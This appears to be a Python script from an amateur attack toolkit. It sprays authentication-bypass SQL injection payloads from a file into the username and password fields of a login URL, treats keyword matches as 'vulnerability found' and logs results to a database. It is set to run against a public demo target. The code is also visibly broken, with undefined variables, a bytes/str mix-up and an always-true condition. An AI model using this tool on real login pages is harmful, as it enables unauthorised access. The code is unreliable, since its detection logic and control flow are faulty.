import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
# import sock
# from database import create_database_for_Captures
import sqlite3


############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads  
                """



####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################


#



async def auth_SQL_inj_binary(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern 
        done = False 
        filename = "auth_bypass.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "rb") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows) 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with url: {urls} \n Do you want to send the payload to the website? ")

                if ask.lower() == "y": 
                    for line in sorted_payload.split("\n"): 
                        #############################################################33
                        params = { 
                            "username": str(line),
                            "password": str(line)
                        }
                        ##############################################################################
                        # print(line)
                        ack = requests.post(url=urls, data=params,verify=False)
                        print(f"[{datetime.now()}]",Fore.RESET+Fore.LIGHTRED_EX+"|Current payload: |", Fore.RESET ,"|with status code|:",Fore.RESET+Fore.MAGENTA+ack.status_code) #* prints the current status code with its payload
                        # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5) #! This prevent the program from crashing 
                        if "error" in ack.text: 
                            error_string = re.search(r'(error)', ack.text, re.IGNORECASE)
                            if error_string_name:
                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", error_string_name.group().decode('utf-8'))
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                        if vuln:
                            print(f"[{datetime.now()}]",Fore.RESET+Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",Fore.RESET+Fore.BLACK+len(vuln),"|Attack:|"+"|authentication bypass SQL injection|")
                            await asyncio.sleep(3) 
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RESET+Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",Fore.RESET+Fore.GREEN+len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text 
                        errword = "error" in req.text
                        if word:
                                error_string = re.search(r'\bid\b', ack.text, re.IGNORECASE)
                                if error_string_id:
                                    print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","|Error:|",error_string_id.group().decode('utf-8'))
                                    await asyncio.sleep(3)
                        
                        if errword:
                                error_string = re.search(r'\berror\b', ack.text, re.IGNORECASE)
                                if error_string_err:
                                    print(f"[{datetime.now()}]",Fore.RED +"|Vulnerability found in the Error based attack Status|:","|" ,Fore.GREEN+errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","|Error:|",error_string_err.group().decode('utf-8'))
                                    await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302: 
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection")
                        done = True
                    
                    if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.",Fore.YELLOW+"|Attack:|",Fore.LIGHTMAGENTA_EX+"authentication bypass SQL injection")
                        
            else:
                print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection")
                
        # capturesAUTHBYPASS.append(str(htmlVULN))
        # capturesAUTHBYPASS.append(str(vuln))
        # await create_database_for_Captures()
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()
        
                        
                    
    except Exception as e:
        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
        
    except KeyboardInterrupt:
        # print(f"[{datetime.now()}]","Exiting...")
        pass
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
        
    except UnicodeEncodeError:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
        
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print(Fore.RED+f"[{datetime.now()}] [INFO]Please Release you RAM space to continue the application"+Fore.RESET+Fore.GREEN+"|Attack:|",Fore.RESET+Fore.LIGHTRED_EX+attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
        
    finally:
        pass
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # capturesAUTHBYPASS.append(ack.text)
        
        
# asyncio.run(auth_SQL_inj_binary(["http://testfire.net/login.jsp"]))
# asyncio.run(auth_SQL_inj_binary("https://redtiger.labs.overthewire.org/"))
# url = "https://redtiger.labs.overthewire.org/"
# asyncio.run(auth_SQL_inj_binary(url))
# if __name__ != "main":
#     pass      

async def auth_main(urL):
    await auth_SQL_inj_binary(urL)

asyncio.run(auth_SQL_inj_binary("http://testfire.net/login.jsp"))
